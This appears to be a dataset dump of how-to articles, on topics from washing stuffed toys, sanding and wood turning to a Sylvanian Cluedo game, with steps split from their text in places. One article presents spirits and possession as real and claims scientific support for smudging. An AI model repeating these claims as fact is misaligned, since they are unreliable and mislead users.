Decorate your house plainly and insert he 'evidence' for the murder.,
Lay out your Sylvanians and choose who you and your friends want to be.,
Roll your dice twice and add up the two numbers.,
Roll the dice again, but only once this time.,
Place your other Sylvanians (not the ones you've selected) wherever you like.,Playing the game,
If you have stairs in your house, roll a dice for each player.,
The youngest player goes first by rolling the dice.,
After each player has had two goes each (or if each team has had 2 goes each), you are allowed to move other Sylvanians.,
When you move the murderer, you have the option to murder somebody.,
If you enter the room where the original, first murder was, you have to miss a go.,
When you play the game for a while, you may find that your Sylvanian characters get murdered.,
To win the game, you must be at a stage where there is only one character and the murderer.",How to Play Cluedo With Your Sylvanian Families,", They can be anywhere you wish, but make sure it looks okay with the rest of the room, a bucket and spade in the bathroom might look a bit weird!, If there are a lot of you, you might want to form teams., Whichever number it was, that Sylvanian is your murderer. Place them wherever you like., That Sylvanian is the murdered person. Place them anywhere, but make sure they look dead!, Try to have it so that there is one in each room. Be careful where you place your Sylvanian figures. Making the murderer stand out won't work very well- you'll see quite soon.,, That player's Sylvanian must stand on the number stair that was rolled on the dice. (e.g. if you roll a 4, the Sylvanian must stand on the fourth stair) If you have no stairs, stand your figures outside the house., Each number is a room. So, if a 5 was rolled, they would go through five rooms and stop in the fifth room. If you land in the room the murder is in on your second go (per 2 goes and then the murderer's turn round), you are dead, unless somebody else is in the room with them., This means you can roll the dice and move a Sylvanian to another place, using the rules you could normally do., You move as normal, but if the murderer is alone with jut one person when they enter a new room, they can murder somebody. Roll the dice to justify whether or not they should be murdered. If the dice displays a number of three or under, the Sylvanian will be a murder victim. If the number is over three, nobody is murdered that time around., The only way you can get out of it is if there is already somebody that is not dead) in that room., When all your own characters are murdered, they can come back into the game., You roll your dice as usual, and when you enter the room in which the murderer is in, you roll the dice again. If the number is under three, the murderer has killed you, and if over three, you have won!"

Determine that the stuffed animal is suitable for washing by machine.,
Determine what sort of washing machine you have.,
Remove any removable parts from the stuffed toy before washing.,
Find a pillowcase that is large enough to contain the stuffed animal.,
Place your stuffed animal into the pillowcase.

,
Dry gently.,
Brush or finger sweep the nap when dry.",How to Wash a Stuffed Animal in the Washing Machine (Gentle Dry Method)," Some stuffed animals will be destroyed by being placed in the washing machine, while others will come out just fine.


Stuffed animals likely to cope with the washing machine include (with the proviso they don't fall into the next category): New to fairly new stuffed animal toys, strong stuffed animals, stuffed animals in good condition without threadbare or loose elements, stuffed animals without
Stuffed animals that cannot be washed in the washing machine include: antique or vintage toys (they're too delicate); those containing any form of music or sound box (it won't work after water goes into the squeaker/music maker); toys with delicate features or glued-on things such as sequins/rhinestones/glitter, etc.; toys containing Styrofoam balls; and any toy that has rips, threadbare areas or looks ready to split.


Realize that a stuffed toy will change in appearance post washing, whether done by machine or by hand; it is the nature of the materials from which it is made. If this is a concern for you, consider dry washing or spot cleaning, or speak to a toy conservator about any special methods that might work.;
, For the sake of a gentle wash, a front loader will give a kinder wash to your stuffed toys than a top loader with an agitator column. In the case of using a top loader, it's a good idea to include clothing as a buffer against the agitator constantly banging against your stuffed toy during washing.

, Some parts risk coming loose during the machine wash, while other items such as clothing and bows are better washed separately. Determine whether or not any of the removed parts also need washing; if so, they are likely best washed by hand or spot cleaned.

, It will need to include sufficient space for closing and tying off as well.


Alternatives to the pillowcase include a mesh bag used for delicates or a lingerie washing bag, again used for delicates. The downside to this may be size, depending on how large your stuffed animal is. If very larger, resort to the pillowcase.

,, This will ensure that the bag is firmly closed, preventing the stuffed animal from falling out of it. When tying, be sure to enclose the stuffed animal such that it cannot move around with the pillowcase but is held very firmly.

,, The water should be no hotter than the warm setting.

,, Either place the stuffed animal on a porch out of direct sunlight or balance it somewhere in the laundry to drip dry. Do not place in the dryer; the synthetic elements are liable to melt, shrink or change shape and your stuffed animal will not look the same again.

, After washing, the stuffed animal probably won't look exactly as it did prior to washing. However, you can use a baby brush (very soft bristles) or your fingers to brush or comb down the nap in the right direction again, making the ""fur"" look normal again. As well, make any other needed adjustments, such as tying back bows, adding back removed elements and putting clothing back on, where relevant.

Protect yourself by wearing religious or spiritual talismans close to you.,
Firmly ask the spirit to leave, avoiding anger or fear.,
Light a sage smudge stick, carrying around the house and waving in a clockwise motion.,
Spread a little holy water around the house.,
Call upon the prayers of your faith or use common religious prayers against spirits.,
Leave out Kosher salt or raw rice, two substances thought to drive away spirits and malicious energies.",How to Exorcise Your House or Dwelling2," From the Star of David to the West African gris-gris, almost all cultures have items and clothing used to protect the wearer from spiritual attacks. Make sure you choose something you actually have faith in. There is not much use wearing something if you don't believe in it at all, as it is stripped of any use or power.


Keeping several of these items in the house can also help ward off spirits, such as crosses above the door or shrines to benevolent gods and spirits., This is the most common practice, and should be repeated frequently, especially during a cleansing or exorcism. The reason to avoid fear or anger is two-fold: it both keeps your calm (and thus effective) and prevents the spirit, if it is there, from deciding you're a threat to its safety.


Try out the Latin rites, as well: ""Ecce crucis signum, fugiant phantasmata cuncta.""(translates as: “behold the emblem of the Cross; let all specters flee”).Let the spirit know that you mean it no harm, but that the physical world ""is not their place anymore."" Assure them that the spirit world awaits them and they will be safer there.
Remember, spiritual possession is not necessarily ""evil."" Most spirits are simply lost, confused, or still clinging to life, and will leave when asked., These sticks have been used for centuries by shamans and religious leaders and are one of the few tools used by many different faiths. There is even some scientific evidence that smudge sticks promote mental well-being and feelings of calm and pleasure, and the practice is widely used to both protect and fight spirits. When smudging a house, crack open a window and take your time -- let the smoke calm you and the room, slowly directing it to fill the room.


Smudge sticks are simply long bundles of sage leaves and stems tied together into a rod of sorts, then lit on the end. You can also crush the dried sage in a small bowl and light this instead, carrying it around to smudge the house.
Some cultures use ceder in place of sage, but both can be used, as well.
Let the smoke fill the room, especially any rooms where paranormal activity is felt.

, You can get holy water at most Catholic churches, though it helps if you are a practicing member of the faith. Sprinkle it in the corners of rooms, at door and window frames, and any areas where you experience the most physical paranormal activity.You can still get holy water at many churches. Call ahead to make sure they bless water there.

, There are as many different prayers to ward off evil as there are faiths, so you should choose the one that speaks most deeply to you. Don't underestimate this connection -- if a prayer feels useful and powerful, use it. Some common prayers include:


The Lord's Prayer
Archangel Michael's Prayer of Protection
The Serenity Prayer
Personal mantras asking the spirits to leave, If you do, you need to leave a window or door open, as the spirit needs a way to flee the room. If performing prayers or continuing to ask the spirit to leave, repeat these rituals as you spread the salt or rice.Remember that your conviction when doing this is important -- if you are fearful or half-hearted, you will not see any results.

"
Talk to leaders in your faith or spiritual practice, or seek out spiritual mediums or psychics who perform exorcisms.,
Understand that only a few faiths, sects, and groups will perform exorcisms or spiritual cleansings.,
Use the county records, local papers, and neighbors to determine any cause for possession.,
Determine as much as you can about the spirits behavior to aid the professional.,
Remember that your mental fortitude is the key link in any exorcism.",How to Exorcise Your House or Dwelling3," The most important quality of an exorcist, in any practice, is someone who makes your feel comfortable and safe. When you have a good feeling about someone, that bond and confidence will make it much easier to solve your issues. This trust is essential.


The Church of England, some Catholic groups, spirit or faith healers, and mediums are all good places to start asking questions.
Talk to 2-3 groups, if possible, but know that the sorts of groups willing to perform exorcisms are rare.

, As a spiritual, religious, and/or psychic phenomenon, you'll need the advice and guidance of a spiritual, religious, and/or psychic leader if you are still unable to remove the spirits. The problem is that not all faiths and practices believe in spiritual possession, or have systems in place to handle them. While you should work within your own belief system when possible, know that you may face stiff rejection from more conservative leaders.


Most groups will want to come do a quick investigation of the house before undergoing any sort of exorcism. This is a good way to calm your fears if you're unsure if there is a spirit or not.

, This could be easy to see if you uncover a murder that took place in your living room, but the causes for spiritual possession can be much more nuanced as well, from long-forgotten tragedies to deaths that gripped a soul before they were quite ready to go. Like all adversaries, you and your professional will be better prepared to fight if you know what exactly you're up against.


Knowing the cause of a possession can also help you determine what sort of professional to call, as you could be dealing with religious or secular spirits, depending on your beliefs.

, Note anything you can of value, and keep a small log of all the paranormal behavior you experience to help accurately fight off the psychic intrusion. This doesn't only include the physical details -- oftentimes you can sense or feel out a personality through their actions as well.


Do they feel malevolent or mischievous? Do you feel in danger or just bothered?
What rooms or objects does the spirit gravitate towards? Are there places they ignore?
What brought out the spirits presence? When was it first noticed?

, At the end of the day, the power of most spirits depends on the power that you give them.Fear, especially lingering, constant worry and dread, feeds right into their hand, giving them far more presence and power over you than someone who rightly ignores their cries for attention. You are just as important in this equation as the spirit is, any professional you call. Keep sharp and calm and your problems will soon resolve themselves."

Check for signs of a delicate toy.,
Weigh the toy (optional).,
Pre-treat stains (optional).,
Put the toys in a zippered pillowcase.,
Wash the toys in a cold, gentle cycle.,
Air dry.",How to Wash Stuffed Toys1," Always read the tag if possible before putting a stuffed toy in the washing machine. If there are no washing instructions, look for these signs of delicate toys that should be washed using gentle methods only:


Non-removable electrical components (lights, voice box, etc.) or metal frames
Movable limbs (they usually contain delicate wooden joints)
Toys stuffed very densely, stuffed with foam or fiberfill, or that contain paper or plastic stiffeners (you can feel these when you squeeze the toy)
Visibly aged or handmade toys
Leather
All rips and tears should be repaired before machine washing
Toys over 18 inches (45 cm) in any dimension may be damaged in home laundry machines, but some laundromats have larger machines available;
, Stuffing can take a long time to dry once it's wet all the way through. If you weigh the toy before it gets wet, you'll know that it's mostly dry once it's back to its original weight.


If you skip this step, there's a chance you won't give the toy enough time to dry. The internal moisture could cause rot or sagging.

, You'll have the highest chance of removing dry stains if you rub on a mild laundry detergent and let it sit on the toy for ten minutes before you begin the laundry.


A specialized stain removal cleaner may work, but test it on an inconspicuous area of the toy first to see if it causes discoloration.

, This will minimize damage from tumbling. This is especially important in a top-load washer.

, Use a mild laundry detergent. You may add fabric softener to make the toys softer, but never use bleach of any kind.


If none of your laundry detergents are labeled mild, look at the eco-friendly brands. In a pinch, you can use shampoo or dish detergent, but use ¼ or ⅓ of the recommended amount, as it will create a large amount of suds.

, Swing the toy sharply in the air a couple times to fling off surface moisture, then hang up to drip dry in a well-ventilated area. Once the toy has stopped dripping, move it to a well-ventilated area on a towel and leave it for several days to finish drying.


Direct sunlight can cause color fading.
You can sometimes feel damp lumps when you squeeze the toy. Once it feels normal again when squeezed, it is probably done drying.

Use the right type of sandpaper for the job.,
Select 3 grades of your sandpaper: coarse, medium and fine.,
Choose a closed-coat sandpaper for soft woods and open-coat paper for metals and hardwoods.",How to Use Sandpaper1,"


Aluminum oxide is the most popular sandpaper for woodworking, and it also works well on metal and cured finishes.
Garnet is often used on bare wood. It wears quickly, but costs less than other sandpapers.
Silicon carbide is ideal for smoothing metals, plastics and joint compound. It is also used to sand between coats of paint or finish, although it is not ideal for wood.
Ceramic sandpaper can be used on wood and is usually found on belt sanders.;
, A sandpaper's grade will be indicated on the product, measured in ""grit.""


Coarse-grade sandpaper has grit of 40 to 80, medium-grade has 100 to 120, and fine-grade has 150 to 220.
Coarse-grade paper is used to scratch away larger imperfections, and finer grades are used in the last stages of detail.
Grit can be as high as 600, but extra-fine sandpaper is not always necessary.

, ""Closed-coat"" means that the paper is more densely covered in abrasive material than ""open-coat"" products.

"
"
Create your cleaning solution.,
Clean the stuffed animal.,
Dry the stuffed animal.,
Remove odors from the stuffed animal.",How to Wash Stuffed Animals1," Mix two cups of warm water with one tablespoon of liquid dish soap or Castile soap (if your child often chews on the stuffed animal).Use a spoon to mix these ingredients together until suds start to form.;
, Use an old, soft bristled toothbrush or a clean rag to collect some of the suds from your cleaning solution. Apply the suds directly onto the soiled areas of the stuffed animal, and gently scrub away at the stains. Continue dipping the toothbrush or rag into the cleaning solution and scrubbing at soiled areas of the toy.


Be careful to keep the stuffed animal as dry as possible. Some fabric materials may have an altered look and texture after being exposed to water.

, Since the stuffed animal stayed relatively dry during cleaning, use a paper towel to gently blot the damp areas of the toy.


Alternatively, you can allow the toy to air dry by laying it flat on a towel, or hanging it up with a clipped hanger.

, This step is optional, but useful for any stuffed animal that has seen better days. Place the stuffed animal in a large zipped bag, or a garbage bag. Add approximately 2-4 tablespoons of either baking soda, cornstarch, or baby powder to the bag, depending on the size of the stuffed animal.Seal the bag, and gently shake it with the powdered ingredient and toy inside. After shaking, let the toy sit for 20 minutes in the bag, and then remove the stuffed animal.Gently brush off any remaining powder over a garbage, or outdoors.


The powder will absorb any foul odors coming from the stuffed animal.
You can also use a handheld vacuum to remove any lingering powder.

Apply several coats of varnish or lacquer to the wood.,
Let the varnish or lacquer cure overnight.,
Dry-sand the wood.,
Clean the dust off of the wood.,
Choose wet or wet/dry sandpaper.,
Select high-grit wet sandpaper.,
Soak the sandpaper in water overnight.,
Dip the sandpaper in lubricant before you sand.,
Wrap the sandpaper around a wood block or sponge.,
Sand the surface with circular motions.,
Work in a pattern so that you sand the wood evenly.,
Increase the grit of the sandpaper as you go.,
Clean the wood off when you have finished sanding.,
Apply a sealer if you want to.",How to Wet Sand Wood," Sanding is taking off a thin layer of finish or wood to smooth it out. Before you dry sand and wet sand, apply lacquer or varnish, depending on your preference. Use a brush or a rag to apply the finish. Make sure you apply enough finish or you’ll sand right through it.The finish that you choose is mostly personal preference. Oil-based varnish, oil-based polyurethane, and water-based polyurethane are common finishes.
Most of the time softwoods take three coats and hardwoods take two to three coats of finish.;
, Follow the specific instructions on the finish you choose, but typically the finish will need to dry for about an hour between coats. Then let it cure overnight before you begin sanding it., Use an electric sander or hold the sandpaper with your hands. Either way, start with 80 grit sandpaper and progress to 100 grit and then 120 grit. If the wood feels fairly smooth when you rub it, you’re ready to wet sand. Otherwise, continue dry-sanding with 150 and 180 grit.

Dry-sanding knocks down the roughness to a point where wet-sanding is most effective. It’s pointless to wet-sand if you don’t dry-sand first.
If you use an electric sander, read the operator’s manual carefully and use it with caution. If you sand by hand, use gentle forward and backward motions all the way across the piece.

, The most effective way to remove dust is to blow it off with a can of compressed air or a powered air compressor. In a pinch, vacuum the dust off or attach the hose to the blower of the vacuum and blow the dust off.If you have no other option, get a clean rag and dampen it with water. Gently wipe the wood to remove the dust. Be sure to let it dry before you continue.

, Wet-sanding is not done with the same type of sandpaper as traditional dry-sanding. Wet sandpaper is designed to hold up when wet, while dry sandpaper is not. Wet sandpaper also comes in a much finer (higher numbered) grit, which produces a smoother finish.Sanding sponges are commonly used because they conform to the surface better than sandpaper does. Feel free to use these, but keep in mind they might not have the grit you need.

, Besides using wet sandpaper, you need to make sure to get a high grit to ensure a fine smoothness. The lowest grit you should use is 200, but you’ll find up to about 2000 grit. It comes down to how much time you have available and your preference.For example, purchase wet sandpaper that’s 250, 500, 750, and 1000 grit. Start with the lowest, and increase the grit as you go if you want the wood smoother.
You may find that the second round of wet-sanding does not seem to make the wood any smoother. In this case, stop after using the 500 grit paper.

, No matter what you do, the sandpaper will dry out as you use it. To keep it wet longer, soak it overnight so it absorbs as much water as possible. If you are in a rush, soak it for at least 15 minutes while you get everything set up.This is not mandatory, because you’ll still dip it in lubricant when you start, but soaking is best when you have the time.

, While soaking the sandpaper is helpful to prepare it, you still need to dip it in lubricant on occasion as you sand. Mix a solution of water and dish soap for an effective lubricant. Mineral spirits also work well.You don’t need to keep the sandpaper dripping wet, but make sure that it doesn’t go dry while you work. Wet the paper again every few minutes, as a general rule.

, To make sure a few square inches (20 sq. cm) of sandpaper remains in contact with the wood, use a block or sponge. If you simply hold the sandpaper in your hand, you won’t cover as much area.Again, this is not absolutely necessary, but it is the most efficient way to sand wood.

, Holding the sandpaper against the wood, apply a small amount of pressure. Move your hand in circular motions. It is not necessary to follow the grain of the wood while you sand. Make sure to keep your hand moving along the wood, rather than staying in one spot.

Each spot only needs one or two circular swipes.

, Start in a corner of the piece of wood and work along one edge to the other side. Then move down the wood a bit and sand back across toward the corner you started at. Repeat this pattern, sanding from side to side, until you have covered the entire surface., After giving the entire surface an even sanding with the first grit, run your hand across it. If it feels smooth enough to you and it looks good, leave it alone. If you want it smoother, grab a higher grit and repeat the process.

Each piece of sandpaper should be soaked and kept wet with mineral spirits or water and dish soap.

, Even wet-sanding is sure to leave some dust on the surface of the wood. Use the compressed air or vacuum you used before to remove all of the dust from the wood. In a pinch, use a slightly dampened cloth to clean the wood., Your wood will be smooth after you wet-sand, but you may want to add more gloss or waterproofing. Use a wood sealer of your choice. Make sure it will go over the finish you already used. Apply it with a rag or paper towel so you don’t leave brush strokes."

Position the board in front of the layout line and place your toe against the back.,
Pull the nail to about a 50-degree angle and set it with a couple of hammer taps.,
Drive toenails into the opposite side to complete the toenailing, and at the same time drive the board back to the layout line.,
Toenails have an amazing power to move lumber.",How to Toenail Wood," Start the nail by tapping it about 1/4 inch (6.35 mm) straight in, not at an angle. Position the board about 1/4 inch from your mark so the nail will drive it to the right spot.;
, Then let go and drive it in. Brace your toe against the back of the board as you set the nail. It’s okay if the board moves slightly past the layout line. Driving a toenail requires greater hammer control and precision than regular nailing. Hold the hammer at the end of the handle with a firm but relaxed grip. Swing from your elbow with a little wrist snap at the end of the stroke for extra oomph. Luckily, you don’t have to worry about leaving hammer marks when you’re rough framing walls and floors. As the nail gets close to fully driven, adjust your swing ever so slightly away from you so the face of the hammer will contact the nail head off center. Catching the head of the nail with the edge of the hammer face allows you to drive the toenail completely.

, If the board is twisted, toenail the side that needs to be forced back.

, This power is especially handy when you’re working with framing lumber or decking that’s not as straight as you’d like. Use big nails with big heads like 16d sinkers for these jobs. In fact, if one nail doesn’t do the job, drive another alongside to move the board even farther.

Check for delicate parts.,
Submerge and squeeze the toy.,
Add mild detergent.,
Scrub the toy, squeezing periodically.,
Squeeze out and drip dry.",How to Wash Stuffed Toys2," Washing a toy in a sink or bathtub is safer than machine washing, but there are some toys that should not be submerged in water:


Toys with electrical components that cannot be fully removed
Toys filled with foam, fiberfill, or paper stiffeners
Fragile toys with tears or wear from extremely heavy use
Leather toys

, Fill a tub, clean sink, or bathtub with cold water. Submerge the toy and squeeze, then lift it and squeeze out the water again. Repeat two or three times. This will remove light surface grime.

, Add a spoonful or two of mild laundry detergent or shampoo to the water and stir to make suds.

, Use a clean toothbrush or stiff-bristled brush to scrub the dirt from the toy. Squeeze out the suds periodically.


This may work best if you squeeze the toy while partially submerged, so some air and suds get into it as well as water.

, Squeeze the toy to remove most of the water, but do not twist or wring it. Hang the toy up to drip dry, then put it on a towel to air dry for several days.

Use other methods for young children.,
Remove dust and odor (optional).,
Mix a bowl of soapy water.,
Dampen a clean cloth.,
Wipe the fur.,
Rinse by wiping with plain water.,
Dry the toy with a towel.,
Let the toy air dry.",How to Wash Stuffed Toys3," Young children, especially ones who put the toys in their mouth, should have their stuffed toys cleaned in hot water using one of the other methods, in order to sterilize them. If the toy cannot withstand the other washing methods, it may not be suitable for young children., If you're cleaning toys without noticeable grime or stains, or extremely delicate toys, try one of these extra-gentle options. In most cases, you can skip down to the next step and start mixing soapy water instead.


To remove dust, wet a cloth in plain water, then wring it out until it is almost completely dry. Gently wipe away the dust. Alternatively, use the hose attachment on a vacuum cleaner.
To remove odor, put the toy in a paper bag with a spoonful or two of baking soda. Close and shake the bag to coat the toy, let it sit 30 minutes, then brush out the baking soda with a dry towel.
To remove light dirt on extra-fragile toys, put it in the bag with cornmeal instead, or brush the fur with a plastic comb that has not touched human hair or hair-styling products.

, Fill a medium bowl with water and add a small amount of mild soap, shampoo, or detergent. Mix to create suds.


Baby shampoo and mild wool detergent are especially soft on fur.
If using any other cleaner, including non-mild detergent, dab it on an inconspicuous area with a cotton swab first and let it dry, to test for color changes or damage.

, Wet the cloth and wring it out until it is almost dry. If the cloth is wet enough to soak into the stuffing, it can cause rot or other damage.


If you are worried about water damage, just pick up some suds from the surface. Suds alone may not be effective for significant grime.

, Concentrate on the dirty areas only, or on one area at a time if cleaning the whole toy. Wet and thoroughly wring the cloth occasionally to keep it damp, but not wet.

, Wet the cloth with plain water and wipe the toy to remove traces of soap. As before, wring the cloth out first so it is mostly dry.

, Wipe the toy down with a clean towel. Move between different parts of the towel as you go, as the towel becomes damp. Once the toy feels dry, give it one final rub against the nap of the fur to remove the last of the moisture.

, Leave it in a well-ventilated area away from direct sunlight, until the last remaining moisture has evaporated. This should take less than an hour, unless the moisture penetrated the surface.


Do not tumble dry or blow dry stuffed toys, as the heat can cause fading and damage.

Clean sawdust off the workpiece, and repeat the sanding process with the medium-grade sandpaper.

,
Clean the workpiece once more, and sand again with the fine-grade sandpaper.

,
Sand all sections of the piece evenly by sanding in the direction of the grain.,
Sand the workpiece with finer paper if 3 Sands was not enough.,
Use a rubber cement block against the surface of your sandpaper.",How to Use Sandpaper2,",


Sand in a back and forth pattern with the grain.
Whenever possible sand in one direction when sanding the end grain.
Use a sanding block when working on flat pieces. You can buy one or just wrap the sandpaper around a piece of wood block.

,,, Problems such as scratches or unevenness will be magnified by not sanding with the grain, once you add finish to the workpiece.

, If you are going to use a water-based stain on the piece, you should sand with up to 200-grit paper.

, The blocks clean out dust clogs and extend the paper's life.

Rinse the stuffed animal.,
Dry the stuffed animal.",How to Wash Stuffed Animals2," Check the check to see the suggested method for cleaning the stuffed animal. If the tag says to avoid fully soaking the toy, you may want to only spot clean the stuffed animal.


Always follow the suggested cleaning instructions.
If the stuffed animal has electronic parts, the tag will most likely caution against contact between electronic parts and water.

, Fill a sink about ¾ of the way with cold water. Add 1-2 tablespoon of delicate laundry cleaner.Use your hand to mix up the water and soap solution until soap bubbles start to form.

, Fully submerge the stuffed animal into the water and soap mixture. Use your hands to work out the stains on the stuffed animal’s surface. Squeeze, knead, and wring the stuffed animal to work the soapy mixture into the toy.


Do not submerge stuffed animals that have electronic parts on the interior of the toy. Submerging the toy will damage the electronic parts, and could electrocute you.
You can use an old, soft bristled toothbrush to help scrub out stains.

, After washing, remove the stuffed animal from the water, and let the soap water drain. Then turn the cold water on, and rinse off any remaining soap residue. Be sure to completely rinse and wring out all areas of the stuffed animal., Wring out the stuffed animal to remove excess water. Then use a dry towel to squeeze the stuffed animal and absorb more water.

Purchase a wood lathe.,
Set up the lathe in a space with good lighting in an area that makes for easy cleanup for the wood chips and dust.

,
Sketch out the shape you want to achieve on a sheet of paper, keeping the design within the limits of the wood blank and capacity of the lathe.

,
Begin turning by finding the center of the wood stock on each end.,
Slide the tailstock center spur up to the center of the other end of the wood, locking it down.

,
Turn the handle on the tailstock center, driving the wood blank into the spurn of the headstock securing it between the centers.

,
Set the tool rest to an approximate center of the work piece and as close as possible without it hitting the work piece when it is turning.

,
Start the lathe on slow speed and use a gouge to rough out or round off the piece to the basic shape you need.

,
Position the large gouge, tip turned up, onto the tool rest with the end of the handle against your hip.,
Use the parting tool with a pair of outside calipers to set the depth of cuts you will need.,
Set the skewed chisel at an angle onto the tool rest.,
Sand the piece while it is still mounted and turning at a slow speed.,
Cut the end of the work that is attached to the headstock and tailstock loose with the parting tool.",How to Turn Wood," You will also need accompanying turning tools.


Lathes and basic turning tools are found in woodworker supply stores. The basic tools include a parting tool, gouge, skewed chisel and scraper.;
,,,


Draw a line from one corner to opposite corner on square or rectangular stock. The point where the lines intersect will be the center.
On round stock, use a self-centering tool and follow manufacturer's instructions.
Mount the wood by centering it onto the headstock of the lathe spur.

,,,,,


Slowly lower the tip until it engages the wood and begins to chatter.
Work the gouge back and forth along the wood surface and against the tool rest until the chattering stops and the stock is round.
Increase the speed of the lathe and use the small gouge to finish roughing out the shape.

,


Hold the narrow end of the tip against the tool rest and push it straight into the work piece. Check the calipers frequently until you achieve the depth you need.

,


Refine the shape you want by moving the chisel back and forth over the tool rest and surface of the wood blank.
Trial and error will help to determine the most efficient angle needed to hold the skewed end of the chisel to the face of the work.
Employ the rounded flat end of the scraper chisel, supported against the tool rest, to run over the surface, smoothing out any tool marks.

, Begin with 180 grit and finish with 440 grit sandpaper.

, This will sever it from the finish piece while the work is still slowly turning.


Continue supporting the back side of the piece with your gloved hand. The work piece will fall off into your hand.
You can remove the piece from the other end by cutting it off with a fine-toothed hand saw. Set the tool rest to an approximate center of the work piece, and as close as possible, without it hitting the work piece when it is turning.

Open the door.,
Look carefully at the shank of the inside knob.,
Remove the knob rose plate, if necessary.,
Remove the thumb-turn.,
Unscrew the lock cylinder.,
Remove the face plate.,If you need to remove the grip handle, this is usually either mounted with wood screws from the outside, or some have a through bolt(s) from the inside.",How to Take out a Mortise Lock," On the edge of the door you should see a long brass plate with a latch, a bolt and a couple of buttons. On the inside there is usually a knob that actuates the latch, and a thumb-turn that throws the bolt. On the outside, there is usually a grip handle with a small thumb actuated lever, and above this is a lock cylinder and escutcheon.
, Usually there is a set screw or two that retains the knob on the spindle.

Once the screws are backed off you can then unscrew the knob. The threaded spindle is usually in two halves. One half will slip out and then the other half can be tipped out of the hole.
Note: if you have a threaded two piece spindle the correct way to orient the set screw is so that it squeezes the two halves together. (A variation here is a non threaded spindle. Here the set screw goes into a hole on the spindle and the knob will slide of the spindle when the set screw is removed.)

, The knob rose plate is usually screwed to the door with short little wood screws. If you are painting the door you will want to remove it, if the lock needs to be serviced you can leave the knob rose plate in place., The thumb-turn is usually retained by two small screws. Remove these and the thumb turn will pull straight off. (An uncommon variation is a thumb turn that threads in to the lock body, and is removed like the outside cylinder.), The lock cylinder is threaded into the lock body and is retained by a set screw. Most often the set screw is exposed but sometimes it will be behind a cover plate. The cylinder set screw will be in line with the cylinder on the edge of the door. Here, you do not want to remove the set screw, but just to back it off enough so the cylinder will turn, (2-4 turns is usually enough) An easy way to unscrew the cylinder is to insert the key almost all the way, and use the key to unscrew the cylinder., Now the only thing holding the lock body in the door is 2 wood screws at the top and the bottom of the plate. If someone has painted the lock body in place, you can usually cut through the paint film with a utility knife. If you extend the bolt, you should be able to slide the lock body out of the pocket. Sometimes, if the lock body is stuck, what works is to insert a screwdriver into the spindle hole and pull a bit until the face plate comes out a bit. What you *DON'T WANT TO DO* is to try to pry the face plate. This method messes up both the door and the face plate.,"

Check the stuffed animal’s tag.,
Inspect your stuffed animal.,
Put the stuffed animal into a mesh laundry bag.,
Change the washing machine settings.,
Wash the stuffed animal.,
Dry the stuffed animal.",How to Wash Stuffed Animals3," Check the stuffed animal’s tag for washing instructions. Depending on the stuffed animal’s fabric and inside material, the toy may or may not be machine washable, and may need to be washed by hand or spot cleaned.


Always follow the suggested cleaning instructions.

, Check to see if there are any electronic parts on or inside the stuffed animal. Make sure any ribbons or string are secured and tied tightly before washing. Any removable plastic pieces such as crowns, swords, purses, or any other accessories, should be detached before washing.


Do not machine wash any stuffed animals that have electronic parts. These parts will be ruined in the wash, and can damage your machine.
If the stuffed animal has fragile clothing that can’t be taken off (or is made out of glitter, sequins, or rhinestones) consider washing the toy by hand. These items can easily become loose in the wash machine.

, Putting your soiled stuffed animal into a mesh laundry bag allows the toy to be delicately cleaned in the wash machine, while catching any parts that might come off during the wash.A mesh bag also prevents the stuffed animal from getting caught on the machine’s interior.


Alternatively, you can use a pillowcase to encase the stuffed animal in the washing machine, though it doesn't clean the stuffed animal as well because less suds and water gets to the stuffed animal.

, The wash machine should be set to a delicate or gentle washing cycle. Change the water temperature setting to wash with cold water.The cold water will reduce any dyes on the stuffed animal from bleeding.

, Insert the stuffed animal into the wash machine and add a small amount of mild laundry soap (about two tablespoons worth). Wash the stuffed animal by itself in the wash machine.


Be very cautious of washing old or antique stuffed animals in the wash machine. Even on a gentle cycle, washing the stuffed animal by hand might be the gentlest option.

, After washing, remove the stuffed animal from the mesh laundry bag. Reshape the stuffed animal if any lumps or bumps have developed from washing. Allow the stuffed animal to air dry laying it flat on a towel, clipping the toy on a hanger, or clothes pinning the toy outside.


Drying a stuffed animal in a dryer (even if the dryer is on a low-heat setting) can cause glue and fur to melt. Avoid drying the stuffed animal in a dryer."

Choose pallets that show no sign of deterioration.,
Don’t try to take apart pallets with regular tools.,
Purchase a Sawzall tool.,
Buy a metal cutting 12-inch (30.5cm) demolition blade.,
Install the blade on your saw.,
Put on some safety goggles, work clothes and gloves.,
Prop the pallet up vertically if you can get it securely clamped to a surface.,
Find the two main vertical pieces of wood on the pallet.,
Start your reciprocating saw.,
Continue cutting down one side of the vertical slat until all the horizontal slats are loose and cut free of the nails.

,
Go to the other vertical slat and repeat the process through the other side of the pallet.,
Move to the back of the pallet where the frame of the pallet is construction.",How to Take Apart a Pallet Without Breaking It1," Although they might be easier to disassemble, the wood is more likely to be damaged beyond use. You can get up to 40 feet (12m) of wood from a good pallet.;
, Shipping pallets are built with annular ring nails, which are meant to stay put.

, A handheld reciprocating saw will reduce pallet deconstruction from 30 minutes or more to about 10 minutes.

, The five-inch (12.7cm) blade that comes with the saw will not work, and you will break the saw if you use it for this project., Make sure it is secure. Plug the saw into an electrical outlet.

, Earplugs or ear protectors will also reduce the risk of hearing loss.

, If you can’t, lay it across sturdy workbenches and you can saw the nails off using a horizontal motion.

, The smaller horizontal slats, usually 2 x 4 wood, should be nailed to these pieces to create the top surface of the pallet. You will need to cut through the nails along the vertical pieces where the horizontal and vertical slats meet.

, Place your saw between the two pieces of wood and cut downward or sideways, away from your body, in a smooth motion. You will cut through the spiral nails that connect the two pieces of wood.,, The horizontal boards may start to fall off. Ask a friend to pile them up if they are becoming a hazard.

, Move around the outer edge, cutting between the wood where the frame pieces meet.

Move your table to a well-ventilated work area.,
Sand surfaces where you’ll apply Varathane.,
Remove any sawdust from the table.,
Choose between water- and oil-based Varathanes.,
Stir the Varathane to mix it.,
Brush the Varathane onto the table.,
Test the coat for dryness.,
Sand the coat lightly with 220-grit sandpaper when dry.,
Apply a second coat in the same fashion as the first.,
Polish the dried surface with an automotive polishing compound.",How to Varathane a Table," Varathane gives off fumes that can be dangerous if they build up. Choose a work area with good airflow to prevent this. You may want to lay out a drop cloth beneath the table to catch sawdust and Varathane drips.

If you have to work in a smaller room, make sure you open some windows. In rooms with less than ideal airflow, use a fan.
A clean work area is preferred, as this will prevent dust from spreading to the Varathane as it dries.;
, Varathane will make any imperfections in the surface of your table more visible.Sand the surface of your table thoroughly so it is smooth and uniform.

